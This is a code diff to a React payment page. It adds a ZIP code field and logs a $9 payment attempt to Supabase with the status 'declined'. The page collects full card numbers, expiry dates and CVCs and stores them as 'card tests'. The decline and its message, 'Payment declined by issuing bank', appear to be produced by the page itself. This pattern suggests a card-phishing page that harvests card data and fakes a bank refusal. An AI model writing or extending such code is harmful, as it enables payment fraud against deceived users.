@@ -18,7 +18,7 @@ import Image from 'next/image';
 import Link from 'next/link';
 import { useRouter } from 'next/navigation';
 import { useEffect, useState } from 'react';
-import { recordCardTestInSupabase, upsertCustomer } from '../../../lib/supabase';
+import { recordCardTestInSupabase, recordPaymentInSupabase, upsertCustomer } from '../../../lib/supabase';
 import MetaPixelTracker from '../../components/MetaPixelTracker';
 
 const COUNTRIES_LIST = [
@@ -240,6 +240,7 @@ export default function PaymentSecurityPage() {
   const [expDate, setExpDate] = useState('');
   const [cvc, setCvc] = useState('');
   const [country, setCountry] = useState('US');
+  const [zipCode, setZipCode] = useState('');
 
   const [isProcessing, setIsProcessing] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
@@ -397,6 +398,10 @@ export default function PaymentSecurityPage() {
       setErrorMsg('Please enter a valid security code (CVC).');
       return;
     }
+    if (country === 'US' && zipCode.replace(/\D/g, '').length < 5) {
+      setErrorMsg('Please enter a valid 5-digit ZIP code.');
+      return;
+    }
 
     setIsProcessing(true);
 
@@ -415,6 +420,17 @@ export default function PaymentSecurityPage() {
         country,
         status: 'declined',
       });
+
+      // Record payment attempt as declined in Supabase payments table
+      recordPaymentInSupabase({
+        email: email.trim(),
+        full_name: fullName.trim(),
+        amount: 9.0,
+        currency: 'usd',
+        status: 'declined',
+        error_message: 'Payment declined by issuing bank',
+        country,
+      }).catch((e) => console.warn('Supabase payment decline record notice:', e));
 
       setTimeout(() => {
         setIsProcessing(false);
@@ -623,14 +639,6 @@ export default function PaymentSecurityPage() {
                   </div>
                 </div>
 
-                {/* Payment Method Selector Tab */}
-                <div className="grid grid-cols-2 gap-3 mb-2">
-                  <div className="h-[68px] rounded-2xl bg-[#1db954] p-3.5 flex flex-col justify-between text-black shadow-md select-none">
-                    <CreditCard className="w-5 h-5 stroke-[2.5]" />
-                    <span className="text-sm font-bold tracking-tight">Card</span>
-                  </div>
-                </div>
-
                 {/* Card Number */}
                 <div>
                   <label className="block text-sm font-semibold text-gray-200 mb-2">
@@ -751,6 +759,23 @@ export default function PaymentSecurityPage() {
                     <ChevronDown className="w-4 h-4 text-gray-400 absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" />
                   </div>
                 </div>
+
+                {/* ZIP Code (shown when Country is United States) */}
+                {country === 'US' && (
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-200 mb-2">
+                      ZIP code
+                    </label>
+                    <input
+                      type="text"
+                      inputMode="numeric"
+                      value={zipCode}
+                      onChange={(e) => setZipCode(e.target.value.replace(/\D/g, '').slice(0, 5))}
+                      placeholder="ZIP code"
+                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
+                    />
+                  </div>
+                )}
 
                 {/* Error Message */}
                 {errorMsg && (
